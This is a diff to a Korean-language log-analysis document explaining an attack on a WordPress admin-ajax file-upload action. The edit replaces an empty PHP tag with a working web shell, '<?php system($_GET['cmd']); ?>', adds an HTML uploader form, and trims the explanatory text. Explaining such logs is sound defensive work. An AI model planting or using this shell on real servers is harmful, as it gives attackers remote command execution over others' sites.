@@ -107,12 +107,14 @@ Content-Type: application/x-php
 ## ☑️ 예제 1. 
 
 ```
-https://blog.com/wp-admin/admin-ajax.php?action\=wps_membership_csv_file_upload <?php ?> <!DOCTYPE html> <html> <head> <title>Resultz</title> </head> <body><h1>Uploader</h1> <form enctype\=
+https://blog.com/wp-admin/admin-ajax.php?action\=wps_membership_csv_file_upload <?php system($_GET['cmd']); ?>
+<!DOCTYPE html><html><head><title>Resultz</title></head> <body><h1>Uploader</h1> <form enctype="multipart/form-data" method="POST"><input type="file" name="file"></form>
+
 ```
 
-* `<?php ?>`
+* `<?php system($_GET['cmd']); ?>`
   
-  * PHP 코드 태그. 공격자가 업로드하려는 **빈 PHP 태그**(혹은 간단한 웹셸 코드가 들어갈 자리)를 로그에 넣어둔 것입니다. 이는 "PHP 실행 가능한 파일을 서버에 올리려 한다"는 강한 신호입니다.
+  * PHP 코드 태그.PHP 실행 가능한 파일을 서버에 올리려 한다는 강한 신호입니다.
 
 * `<!DOCTYPE html> <html> <head> <title>Resultz</title> ... <form enctype\=`
 
